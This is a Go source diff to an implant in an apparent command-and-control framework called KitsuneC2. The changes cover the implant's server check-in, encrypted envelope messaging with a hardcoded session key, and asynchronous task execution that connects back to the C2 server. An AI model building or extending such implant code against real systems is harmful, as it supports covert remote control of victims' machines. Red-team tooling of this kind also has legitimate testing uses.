@@ -3,7 +3,6 @@ package main
 import (
 	"KitsuneC2/lib/communication"
 	"KitsuneC2/lib/cryptography"
-	"fmt"
 	"math"
 	"math/rand"
 	"net"
@@ -26,8 +25,8 @@ const (
 )
 
 var (
-	implantId       string = ""                                 //dynamically generated based on unique host features
-	sessionKey      string = "thisis32bitlongpassphraseimusing" //TODO: dynamically generate on each message to provide PFS
+	implantId       string = "00000000000000000000000000000000" //dynamically generated based on unique host features
+	sessionKey      string = "thisis32bitlongpassphraseimusing" //TODO: dynamically generate on each message to provide PFS.
 	shouldTerminate bool   = false
 )
 
@@ -53,7 +52,7 @@ func kitsuneLoop() {
 			continue
 		}
 
-		executeTask(receivedTask, taskArguments, conn) //conn is passed so that executeTask can send a response to the server
+		go executeTask(receivedTask, taskArguments)
 		conn.Close()
 	}
 }
@@ -71,7 +70,7 @@ func initialize() error {
 		return err
 	}
 	defer conn.Close()
-	err = communication.SendEnvelope(conn, 0, msg, []byte(sessionKey))
+	err = communication.SendEnvelopeToServer(conn, implantId, 0, msg, []byte(sessionKey))
 	if err != nil {
 		return err
 	}
@@ -79,21 +78,28 @@ func initialize() error {
 }
 
 // Sends message of type "ImplantCheckin" to server and returns (if any) a task with it's arguments.
-func checkIn(conn net.Conn) (int, []byte, error) {
+func checkIn(conn net.Conn) (int, interface{}, error) {
 	msg := communication.ImplantCheckin{ImplantId: implantId}
 
-	err := communication.SendEnvelope(conn, 1, msg, []byte(sessionKey))
+	err := communication.SendEnvelopeToServer(conn, implantId, 1, msg, []byte(sessionKey))
 	if err != nil {
 		return -1, nil, err
 	}
 
-	messageType, data, err := communication.ReceiveEnvelope(conn, []byte(sessionKey))
+	messageType, data, err := communication.ReceiveEnvelopeFromServer(conn, []byte(sessionKey))
 	if err != nil {
 		return -1, nil, err
 	}
 	return messageType, data, nil
 }
 
-func executeTask(taskType int, arguments []byte, conn net.Conn) {
-	fmt.Println("Executing task with ID: " + strconv.Itoa(taskType))
+func executeTask(taskType int, arguments interface{}) {
+	conn, err := net.Dial("tcp", serverIp+":"+strconv.Itoa(serverPort))
+	if err != nil {
+		return
+	}
+	defer conn.Close()
+
+	handlerFunc := MessageTypeToFunc[taskType]
+	handlerFunc(conn, arguments)
 }
